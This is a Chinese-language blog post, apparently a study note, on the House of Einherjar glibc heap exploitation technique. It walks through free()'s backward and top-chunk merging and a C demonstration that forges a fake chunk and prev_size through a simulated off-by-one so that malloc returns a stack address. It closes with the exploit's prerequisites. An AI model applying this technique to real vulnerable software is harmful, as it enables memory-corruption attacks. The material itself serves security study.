@@ -1,0 +1,678 @@
+<!DOCTYPE html>
+<html lang="zh-CN" color-mode="light">
+
+  <head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <meta name="keywords" content="" />
+  <meta name="author" content="Closure" />
+  <meta name="description" content="" />
+  
+  
+  <title>
+    
+      House Of Einherjar 
+      
+      
+      |
+    
+     Closure
+  </title>
+
+  
+    <link rel="apple-touch-icon" href="/images/favicon.png">
+    <link rel="icon" href="/images/favicon.png">
+  
+
+  <!-- Raleway-Font -->
+  <link href="https://fonts.googleapis.com/css?family=Raleway&display=swap" rel="stylesheet">
+
+  <!-- hexo site css -->
+  <link rel="stylesheet" href="/css/main.css" />
+  <link rel="stylesheet" href="//at.alicdn.com/t/font_1886449_67xjft27j1l.css" />
+  <!-- 代码块风格 -->
+  
+
+  <!-- jquery3.3.1 -->
+  
+    <script defer type="text/javascript" src="/plugins/jquery.min.js"></script>
+  
+
+  <!-- fancybox -->
+  
+    <link href="/plugins/jquery.fancybox.min.css" rel="stylesheet">
+    <script defer type="text/javascript" src="/plugins/jquery.fancybox.min.js"></script>
+  
+  
+<script src="/js/fancybox.js"></script>
+
+
+  
+
+  
+    <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+  
+
+  <script>
+    var html = document.documentElement
+    const colorMode = localStorage.getItem('color-mode')
+    if (colorMode) {
+      document.documentElement.setAttribute('color-mode', colorMode)
+    }
+  </script>
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+
+  <body>
+    <div id="app">
+      <div class="header">
+  <div class="avatar">
+    <a href="/">
+      <!-- 头像取消懒加载，添加no-lazy -->
+      
+        <img src="/images/avatar.png" alt="">
+      
+    </a>
+    <div class="nickname"><a href="/">Closure</a></div>
+  </div>
+  <div class="navbar">
+    <ul>
+      
+        <li class="nav-item" data-path="/">
+          <a href="/">主页</a>
+        </li>
+      
+        <li class="nav-item" data-path="/archives/">
+          <a href="/archives/">归档</a>
+        </li>
+      
+        <li class="nav-item" data-path="/tags/">
+          <a href="/tags/">Tags</a>
+        </li>
+      
+        <li class="nav-item" data-path="/friends/">
+          <a href="/friends/">Friends</a>
+        </li>
+      
+        <li class="nav-item" data-path="/about/">
+          <a href="/about/">关于我</a>
+        </li>
+      
+    </ul>
+  </div>
+</div>
+
+
+<script src="/js/activeNav.js"></script>
+
+
+
+      <div class="flex-container">
+        <!-- 文章详情页，展示文章具体内容，url形式：https://yoursite/文章标题/ -->
+<!-- 同时为「标签tag」，「朋友friend」，「分类categories」，「关于about」页面的承载页面，具体展示取决于page.type -->
+
+
+  <!-- LaTex Display -->
+
+  
+    <script async type="text/javascript" src="/plugins/mathjax/tex-chtml.js"></script>
+  
+  <script>
+    MathJax = {
+      tex: {
+        inlineMath: [['$', '$'], ['\\(', '\\)']]
+      }
+    }
+  </script>
+
+
+
+
+
+  <!-- clipboard -->
+
+  
+    <script async type="text/javascript" src="/plugins/clipboard.min.js"></script>
+  
+  
+<script src="/js/codeCopy.js"></script>
+
+
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  <!-- 文章内容页 url形式：https://yoursite/文章标题/ -->
+  <div class="container post-details" id="post-details">
+    <div class="post-content">
+      <div class="post-title">House Of Einherjar</div>
+      <div class="post-attach">
+        <span class="post-pubtime">
+          <i class="iconfont icon-updatetime mr-10" title="更新时间"></i>
+          2022-03-18 14:48:52
+        </span>
+        
+              <span class="post-tags">
+                <i class="iconfont icon-tags mr-10" title="标签"></i>
+                
+                <span class="span--tag mr-8">
+                  <a href="/tags/House-of/" title="House of">
+                    #House of
+                  </a>
+                </span>
+                
+              </span>
+          
+      </div>
+      <div class="markdown-body">
+        <h1 id="House-Of-Einherjar"><a href="#House-Of-Einherjar" class="headerlink" title="House Of Einherjar"></a>House Of Einherjar</h1><p>漏洞效果：可以强制使得malloc返回一个几乎任意地址的chunk</p>
+<h2 id="利用原理："><a href="#利用原理：" class="headerlink" title="利用原理："></a>利用原理：</h2><p>当释放堆块下一块为top_chunk时，free会与相邻后向地址进行合并</p>
+<h3 id="free函数："><a href="#free函数：" class="headerlink" title="free函数："></a>free函数：</h3><h4 id="后向合并："><a href="#后向合并：" class="headerlink" title="后向合并："></a>后向合并：</h4><p><img src="https://raw.githubusercontent.com/zh-Closure/images/main/image-20220317162229602.png"></p>
+<p>函数执行流程：</p>
+<p>判断被释放堆块p的inuse标志位是否为0，为0则进行if中内容&#x3D;&#x3D;》</p>
+<p>记录相邻堆块p的prev_size值</p>
+<p>size为size+prev_size</p>
+<p>堆块p的指针最后是由chunk_at_offset()函数决定&#x3D;&#x3D;》</p>
+<p><img src="https://raw.githubusercontent.com/zh-Closure/images/main/image-20220317162610540.png" alt="image-20220317162610540"></p>
+<p>将原本p指针位置加上s偏移后的位置作为合并堆块的新指针&#x3D;&#x3D;》</p>
+<p>在free函数中，就是原本p指针需要减去一个后向堆块size（p-&gt;prev_size）大小的偏移后得到合并堆块的新指针</p>
+<h4 id="与top-chunk合并："><a href="#与top-chunk合并：" class="headerlink" title="与top_chunk合并："></a>与top_chunk合并：</h4><p><img src="https://raw.githubusercontent.com/zh-Closure/images/main/image-20220317163210031.png"></p>
+<p>函数执行流程：</p>
+<p>在执行set_head()函数后，合并堆块的size会变为两个堆块的总和，并且top_chunk的指针会指向被合并的堆块p的位置&#x3D;&#x3D;》top_chunk将p吞并，并取代p的位置</p>
+<h2 id="例："><a href="#例：" class="headerlink" title="例："></a>例：</h2><pre class="language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span>
+<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span>
+<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;string.h></span></span>
+<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdint.h></span></span>
+<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;malloc.h></span></span>
+
+<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+<span class="token punctuation">&#123;</span>
+        <span class="token function">setbuf</span><span class="token punctuation">(</span><span class="token constant">stdin</span><span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token function">setbuf</span><span class="token punctuation">(</span><span class="token constant">stdout</span><span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+        <span class="token class-name">uint8_t</span><span class="token operator">*</span> a<span class="token punctuation">;</span>
+        <span class="token class-name">uint8_t</span><span class="token operator">*</span> b<span class="token punctuation">;</span>
+        <span class="token class-name">uint8_t</span><span class="token operator">*</span> d<span class="token punctuation">;</span>
+
+        a <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">uint8_t</span><span class="token operator">*</span><span class="token punctuation">)</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x38</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token comment">//创建一个0x48大小的堆块，将malloc指针赋给a</span>
+        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"a: %p\n"</span><span class="token punctuation">,</span> a<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    
+        <span class="token keyword">int</span> real_a_size <span class="token operator">=</span> <span class="token function">malloc_usable_size</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Since we want to overflow 'a', we need the 'real' size of 'a' after rounding:%#x\n"</span><span class="token punctuation">,</span> real_a_size<span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+        <span class="token class-name">size_t</span> fake_chunk<span class="token punctuation">[</span><span class="token number">6</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+    <span class="token comment">//创建数组fake_chunk</span>
+        fake_chunk<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0x100</span><span class="token punctuation">;</span>
+        fake_chunk<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0x100</span><span class="token punctuation">;</span>
+        fake_chunk<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">size_t</span><span class="token punctuation">)</span> fake_chunk<span class="token punctuation">;</span>
+        fake_chunk<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">size_t</span><span class="token punctuation">)</span> fake_chunk<span class="token punctuation">;</span>
+        fake_chunk<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">size_t</span><span class="token punctuation">)</span> fake_chunk<span class="token punctuation">;</span>
+        fake_chunk<span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">size_t</span><span class="token punctuation">)</span> fake_chunk<span class="token punctuation">;</span>
+    <span class="token comment">//在数组下标处赋值</span>
+        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Our fake chunk at %p looks like:\n"</span><span class="token punctuation">,</span> fake_chunk<span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+        b <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">uint8_t</span><span class="token operator">*</span><span class="token punctuation">)</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0xf8</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token comment">//创建一个0x108大小的chunk b，将malloc指针赋给b变量</span>
+        <span class="token keyword">int</span> real_b_size <span class="token operator">=</span> <span class="token function">malloc_usable_size</span><span class="token punctuation">(</span>b<span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"b: %p\n"</span><span class="token punctuation">,</span> b<span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+        <span class="token class-name">uint64_t</span><span class="token operator">*</span> b_size_ptr <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">uint64_t</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>b <span class="token operator">-</span> <span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\nb.size: %#lx\n"</span><span class="token punctuation">,</span> <span class="token operator">*</span>b_size_ptr<span class="token punctuation">)</span><span class="token punctuation">;</span>
+        a<span class="token punctuation">[</span>real_a_size<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
+    <span class="token comment">//将chunk b的inuse标志位修改成0</span>
+        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"b.size: %#lx\n"</span><span class="token punctuation">,</span> <span class="token operator">*</span>b_size_ptr<span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+        <span class="token class-name">size_t</span> fake_size <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">size_t</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">(</span>b<span class="token operator">-</span><span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token class-name">size_t</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">2</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token punctuation">(</span><span class="token class-name">uint8_t</span><span class="token operator">*</span><span class="token punctuation">)</span>fake_chunk<span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Our fake prev_size will be %p - %p = %#lx\n"</span><span class="token punctuation">,</span> b<span class="token operator">-</span><span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token class-name">size_t</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">2</span><span class="token punctuation">,</span> fake_chunk<span class="token punctuation">,</span> fake_size<span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token operator">*</span><span class="token punctuation">(</span><span class="token class-name">size_t</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>a<span class="token punctuation">[</span>real_a_size<span class="token operator">-</span><span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token class-name">size_t</span><span class="token punctuation">)</span><span class="token punctuation">]</span> <span class="token operator">=</span> fake_size<span class="token punctuation">;</span>
+
+        fake_chunk<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> fake_size<span class="token punctuation">;</span>
+
+        <span class="token function">free</span><span class="token punctuation">(</span>b<span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Our fake chunk size is now %#lx (b.size + fake_prev_size)\n"</span><span class="token punctuation">,</span> fake_chunk<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+        d <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x200</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Next malloc(0x200) is at %p\n"</span><span class="token punctuation">,</span> d<span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span></code></pre>
+
+
+
+<p>创建chunk a：</p>
+<img src="https://raw.githubusercontent.com/zh-Closure/images/main/image-20220317202712614.png" style="zoom:67%;" />
+
+<p>修改数组内容：</p>
+<img src="https://raw.githubusercontent.com/zh-Closure/images/main/image-20220317202932133.png" style="zoom:67%;" />
+
+<p>&#x3D;&#x3D;》将prev_size和size设置为0x100，fd，bk,fd_nextsize,bk_nextsize设置为fake_chunk自身地址&#x3D;&#x3D;》</p>
+<p>绕过free()函数向后合并时最后的chunk检查</p>
+<p>创建chunk b：</p>
+<img src="https://raw.githubusercontent.com/zh-Closure/images/main/image-20220317210310817.png" style="zoom:67%;" />
+
+
+
+<pre class="language-c" data-language="c"><code class="language-c"><span class="token class-name">uint64_t</span><span class="token operator">*</span> b_size_ptr <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">uint64_t</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>b <span class="token operator">-</span> <span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre>
+
+<p>&#x3D;&#x3D;》</p>
+<p><img src="https://raw.githubusercontent.com/zh-Closure/images/main/image-20220317210915299.png"></p>
+<p>&#x3D;&#x3D;》将chunk b的malloc指针-0x8位置&#x3D;&#x3D;》将chunk b的size值放在b_size_ptr变量中</p>
+<pre class="language-c" data-language="c"><code class="language-c">a<span class="token punctuation">[</span>real_a_size<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span></code></pre>
+
+<p>&#x3D;&#x3D;》</p>
+<p><img src="https://raw.githubusercontent.com/zh-Closure/images/main/image-20220317211505710.png"></p>
+<p>&#x3D;&#x3D;》a[n]以chunk a的malloc指针为起始的指针数组&#x3D;&#x3D;》数组下标n指向的就是第n+1字节的地址&#x3D;&#x3D;》</p>
+<p>a[real_a_size]指向的是以chunk a的malloc指针为起始，第real_a_size+1个字节的位置等于0（模仿off by one）&#x3D;&#x3D;》覆盖chunk b的inuse标志位为0</p>
+<pre class="language-c" data-language="c"><code class="language-c"><span class="token class-name">size_t</span> fake_size <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">size_t</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">(</span>b<span class="token operator">-</span><span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token class-name">size_t</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">2</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token punctuation">(</span><span class="token class-name">uint8_t</span><span class="token operator">*</span><span class="token punctuation">)</span>fake_chunk<span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre>
+
+<p><img src="https://raw.githubusercontent.com/zh-Closure/images/main/image-20220317215410459.png"></p>
+<p>b-sizeof(size_t)*2&#x3D;&#x3D;》chunk b的malloc指针减去两个地址位宽&#x3D;&#x3D;》chunk b的头指针</p>
+<p>(uint8_t*)fake_chunk&#x3D;&#x3D;》伪造堆块的头指针</p>
+<p>&#x3D;&#x3D;&#x3D;》获得伪造的堆块的size&#x3D;&#x3D;》0xffff8000006033c0是一个负数</p>
+<pre class="language-c" data-language="c"><code class="language-c"><span class="token operator">*</span><span class="token punctuation">(</span><span class="token class-name">size_t</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>a<span class="token punctuation">[</span>real_a_size<span class="token operator">-</span><span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token class-name">size_t</span><span class="token punctuation">)</span><span class="token punctuation">]</span> <span class="token operator">=</span> fake_size<span class="token punctuation">;</span>
+
+fake_chunk<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> fake_size<span class="token punctuation">;</span></code></pre>
+
+<p>real_a_size-sizeof(size_t)&#x3D;&#x3D;》chunk a与chunk b公用的chunk b的prev_size地址&#x3D;&#x3D;》</p>
+<p>模拟通过对chunk a赋值后，影响chunk b的prev_size&#x3D;&#x3D;》</p>
+<p><em>(size_t</em>)&amp;a[real_a_size-sizeof(size_t)] &#x3D; fake_size;&#x3D;&#x3D;》chunk b的prev_size保存着fake_size&#x3D;&#x3D;》</p>
+<p>fake_chunk[1] &#x3D; fake_size;&#x3D;&#x3D;》将fake_chunk的size部分修改成fake_size</p>
+<p><img src="https://raw.githubusercontent.com/zh-Closure/images/main/image-20220317220441685.png"></p>
+<p>释放chunk b：</p>
+<p><strong>fake_chunk与chunk b合并：</strong></p>
+<p>首先检查inuse标志位&#x3D;&#x3D;》0&#x3D;&#x3D;》相邻地址的堆块处于释放状态&#x3D;&#x3D;》</p>
+<p>根据chunk b中的prev_size向前寻找是否存在一个大小为0xffff8000006033c0大小的堆块&#x3D;&#x3D;》</p>
+<p>找到fake_chunk&#x3D;&#x3D;》fake_chunk的size又是0xffff8000006033c0&#x3D;&#x3D;》</p>
+<p>free()函数向后合并机制：</p>
+<p>已部署fake_chunk的fd，bk，fd_nextsize,bk_nextsize&#x3D;&#x3D;》绕过unlink检查&#x3D;&#x3D;》</p>
+<p>chunk b与fake_chunk合并为fake_size+chunk b size大小的堆块&#x3D;&#x3D;》</p>
+<p>大堆块的头指针为fake_chunk的头指针0x7fffffffdc80&#x3D;&#x3D;》</p>
+<p><img src="https://raw.githubusercontent.com/zh-Closure/images/main/image-20220318140729270.png"></p>
+<p><strong>大堆块与top chunk合并：</strong></p>
+<p>chunk b与top chunk紧邻&#x3D;&#x3D;》大堆块与top chunk合并&#x3D;&#x3D;》</p>
+<p>top chunk size&#x3D;&#x3D;old_top_size+fake_chunk_size+chunk_b_size</p>
+<p>申请0x200大小得堆块:</p>
+<p>在bin中没有满足条件的空闲块&#x3D;&#x3D;》向top_chunk申请一个size为0x210大小的堆块&#x3D;&#x3D;》</p>
+<p>top_chunk的头指针为fake_chunk&#x3D;&#x3D;》0x7fffffffdc80&#x3D;&#x3D;》</p>
+<p>被启用的堆块就是以fake_chunk为头指针，size为0x210的堆块&#x3D;&#x3D;》</p>
+<p><img src="https://raw.githubusercontent.com/zh-Closure/images/main/image-20220318143250238.png"></p>
+<p>&#x3D;&#x3D;&#x3D;&#x3D;》</p>
+<p>伪造的fake_chunk被当作正常堆块启用</p>
+<h2 id="漏洞利用总结："><a href="#漏洞利用总结：" class="headerlink" title="漏洞利用总结："></a>漏洞利用总结：</h2><p>1、需要有溢出漏洞可以写物理相邻的高地址的prev_size与prev_inuse部分</p>
+<p>2、需要计算目的fake_chunk与chunk_b地址之间的差&#x3D;&#x3D;》需要泄漏地址</p>
+<p>3、需要在目的chunk附近构造相应的fake chunk&#x3D;&#x3D;》绕过unlink的检测</p>
+<p>4、在最后释放chunk时要保证下一个chunk是top chunk，若不是则无法合并top chunk</p>
+
+      </div>
+      
+        <div class="prev-or-next">
+          <div class="post-foot-next">
+            
+              <a href="/2022/03/17/%E5%B7%A5%E5%85%B7%E4%B8%8E%E5%91%BD%E4%BB%A4/" target="_self">
+                <i class="iconfont icon-chevronleft"></i>
+                <span>上一页</span>
+              </a>
+            
+          </div>
+          <div class="post-attach">
+            <span class="post-pubtime">
+              <i class="iconfont icon-updatetime mr-10" title="更新时间"></i>
+              2022-03-18 14:48:52
+            </span>
+            
+                  <span class="post-tags">
+                    <i class="iconfont icon-tags mr-10" title="标签"></i>
+                    
+                    <span class="span--tag mr-8">
+                      <a href="/tags/House-of/" title="House of">
+                        #House of
+                      </a>
+                    </span>
+                    
+                  </span>
+              
+          </div>
+          <div class="post-foot-prev">
+            
+              <a href="/2022/03/19/How2heap-Glibc2-31/" target="_self">
+                <span>下一页</span>
+                <i class="iconfont icon-chevronright"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+    </div>
+    
+  <div id="btn-catalog" class="btn-catalog">
+    <i class="iconfont icon-catalog"></i>
+  </div>
+  <div class="post-catalog hidden" id="catalog">
+    <div class="title">目录</div>
+    <div class="catalog-content">
+      
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#House-Of-Einherjar"><span class="toc-text">House Of Einherjar</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E5%8E%9F%E7%90%86%EF%BC%9A"><span class="toc-text">利用原理：</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#free%E5%87%BD%E6%95%B0%EF%BC%9A"><span class="toc-text">free函数：</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%90%8E%E5%90%91%E5%90%88%E5%B9%B6%EF%BC%9A"><span class="toc-text">后向合并：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%B8%8Etop-chunk%E5%90%88%E5%B9%B6%EF%BC%9A"><span class="toc-text">与top_chunk合并：</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BE%8B%EF%BC%9A"><span class="toc-text">例：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E6%80%BB%E7%BB%93%EF%BC%9A"><span class="toc-text">漏洞利用总结：</span></a></li></ol></li></ol>
+      
+    </div>
+  </div>
+
+  
+<script src="/js/catalog.js"></script>
+
+
+
+
+    
+      <div class="comments-container">
+        
+
+
+
+
+
+
+
+      </div>
+    
+  </div>
+
+
+        
+<div class="footer">
+  <div class="social">
+    <ul>
+      
+        <li>
+          <a title="github" target="_blank" rel="noopener" href="https://github.com/zh-Closure">
+            <i class="iconfont icon-github"></i>
+          </a>
+        </li>
+      
+    </ul>
+  </div>
+  
+    
+    <div class="footer-more">
+      
+        <a target="_blank" rel="noopener" href="https://github.com/zh-Closure">Copyright © 2023 Closure</a>
+        
+    </div>
+  
+    
+    <div class="footer-more">
+      
+        <a target="_blank" rel="noopener" href="https://github.com/zh-Closure">email | 765003952@qq.com</a>
+        
+    </div>
+  
+  
+    <div class="footer-views">
+      
+          本站总访问量<span id="busuanzi_value_site_pv"></span>次
+        
+      
+      
+          本站访客数<span id="busuanzi_value_site_uv"></span>人
+        
+      
+    </div>
+  
+</div>
+
+      </div>
+
+      <div class="tools-bar">
+        <div class="back-to-top tools-bar-item hidden">
+  <a href="javascript: void(0)">
+    <i class="iconfont icon-chevronup"></i>
+  </a>
+</div>
+
+
+<script src="/js/backtotop.js"></script>
+
+
+
+        
+  <div class="search-icon tools-bar-item" id="search-icon">
+    <a href="javascript: void(0)">
+      <i class="iconfont icon-search"></i>
+    </a>
+  </div>
+
+  <div class="search-overlay hidden">
+    <div class="search-content" tabindex="0">
+      <div class="search-title">
+        <span class="search-icon-input">
+          <a href="javascript: void(0)">
+            <i class="iconfont icon-search"></i>
+          </a>
+        </span>
+        
+          <input type="text" class="search-input" id="search-input" placeholder="可露希尔大涨价……">
+        
+        <span class="search-close-icon" id="search-close-icon">
+          <a href="javascript: void(0)">
+            <i class="iconfont icon-close"></i>
+          </a>
+        </span>
+      </div>
+      <div class="search-result" id="search-result"></div>
+    </div>
+  </div>
+
+  <script type="text/javascript">
+    var inputArea = document.querySelector("#search-input")
+    var searchOverlayArea = document.querySelector(".search-overlay")
+
+    inputArea.onclick = function() {
+      getSearchFile()
+      this.onclick = null
+    }
+
+    inputArea.onkeydown = function() {
+      if(event.keyCode == 13)
+        return false
+    }
+
+    function openOrHideSearchContent() {
+      let isHidden = searchOverlayArea.classList.contains('hidden')
+      if (isHidden) {
+        searchOverlayArea.classList.remove('hidden')
+        document.body.classList.add('hidden')
+        // inputArea.focus()
+      } else {
+        searchOverlayArea.classList.add('hidden')
+        document.body.classList.remove('hidden')
+      }
+    }
+
+    function blurSearchContent(e) {
+      if (e.target === searchOverlayArea) {
+        openOrHideSearchContent()
+      }
+    }
+
+    document.querySelector("#search-icon").addEventListener("click", openOrHideSearchContent, false)
+    document.querySelector("#search-close-icon").addEventListener("click", openOrHideSearchContent, false)
+    searchOverlayArea.addEventListener("click", blurSearchContent, false)
+
+    var searchFunc = function (path, search_id, content_id) {
+      'use strict';
+      var $input = document.getElementById(search_id);
+      var $resultContent = document.getElementById(content_id);
+      $resultContent.innerHTML = "<ul><span class='local-search-empty'>首次搜索，正在载入索引文件，请稍后……<span></ul>";
+      $.ajax({
+        // 0x01. load xml file
+        url: path,
+        dataType: "xml",
+        success: function (xmlResponse) {
+          // 0x02. parse xml file
+          var datas = $("entry", xmlResponse).map(function () {
+            return {
+              title: $("title", this).text(),
+              content: $("content", this).text(),
+              url: $("url", this).text()
+            };
+          }).get();
+          $resultContent.innerHTML = "";
+
+          $input.addEventListener('input', function () {
+            // 0x03. parse query to keywords list
+            var str = '<ul class=\"search-result-list\">';
+            var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
+            $resultContent.innerHTML = "";
+            if (this.value.trim().length <= 0) {
+              return;
+            }
+            // 0x04. perform local searching
+            datas.forEach(function (data) {
+              var isMatch = true;
+              var content_index = [];
+              if (!data.title || data.title.trim() === '') {
+                data.title = "Untitled";
+              }
+              var orig_data_title = data.title.trim();
+              var data_title = orig_data_title.toLowerCase();
+              var orig_data_content = data.content.trim().replace(/<[^>]+>/g, "");
+              var data_content = orig_data_content.toLowerCase();
+              var data_url = data.url;
+              var index_title = -1;
+              var index_content = -1;
+              var first_occur = -1;
+              // only match artiles with not empty contents
+              if (data_content !== '') {
+                keywords.forEach(function (keyword, i) {
+                  index_title = data_title.indexOf(keyword);
+                  index_content = data_content.indexOf(keyword);
+
+                  if (index_title < 0 && index_content < 0) {
+                    isMatch = false;
+                  } else {
+                    if (index_content < 0) {
+                      index_content = 0;
+                    }
+                    if (i == 0) {
+                      first_occur = index_content;
+                    }
+                    // content_index.push({index_content:index_content, keyword_len:keyword_len});
+                  }
+                });
+              } else {
+                isMatch = false;
+              }
+              // 0x05. show search results
+              if (isMatch) {
+                str += "<li><a href='" + data_url + "' class='search-result-title'>" + orig_data_title + "</a>";
+                var content = orig_data_content;
+                if (first_occur >= 0) {
+                  // cut out 100 characters
+                  var start = first_occur - 20;
+                  var end = first_occur + 80;
+
+                  if (start < 0) {
+                    start = 0;
+                  }
+
+                  if (start == 0) {
+                    end = 100;
+                  }
+
+                  if (end > content.length) {
+                    end = content.length;
+                  }
+
+                  var match_content = content.substr(start, end);
+
+                  // highlight all keywords
+                  keywords.forEach(function (keyword) {
+                    var regS = new RegExp(keyword, "gi");
+                    match_content = match_content.replace(regS, "<span class=\"search-keyword\">" + keyword + "</span>");
+                  });
+
+                  str += "<p class=\"search-result-abstract\">" + match_content + "...</p>"
+                }
+                str += "</li>";
+              }
+            });
+            str += "</ul>";
+            if (str.indexOf('<li>') === -1) {
+              return $resultContent.innerHTML = "<ul><span class='local-search-empty'>没有找到内容，请尝试更换检索词。<span></ul>";
+            }
+            $resultContent.innerHTML = str;
+          });
+        },
+        error: function(xhr, status, error) {
+          $resultContent.innerHTML = ""
+          if (xhr.status === 404) {
+            $resultContent.innerHTML = "<ul><span class='local-search-empty'>未找到search.xml文件，具体请参考：<a href='https://github.com/zchengsite/hexo-theme-oranges#configuration' target='_black'>configuration</a><span></ul>";
+          } else {
+            $resultContent.innerHTML = "<ul><span class='local-search-empty'>请求失败，尝试重新刷新页面或稍后重试。<span></ul>";
+          }
+        }
+      });
+      $(document).on('click', '#search-close-icon', function() {
+        $('#search-input').val('');
+        $('#search-result').html('');
+      });
+    }
+
+    var getSearchFile = function() {
+        var path = "/search.xml";
+        searchFunc(path, 'search-input', 'search-result');
+    }
+  </script>
+
+
+
+
+        
+  <div class="tools-bar-item theme-icon" id="switch-color-scheme">
+    <a href="javascript: void(0)">
+      <i id="theme-icon" class="iconfont icon-moon"></i>
+    </a>
+  </div>
+
+  
+<script src="/js/colorscheme.js"></script>
+
+
+
+
+
+        
+  
+    <div class="share-icon tools-bar-item">
+      <a href="javascript: void(0)" id="share-icon">
+        <i class="iconfont iconshare"></i>
+      </a>
+      <div class="share-content hidden">
+        
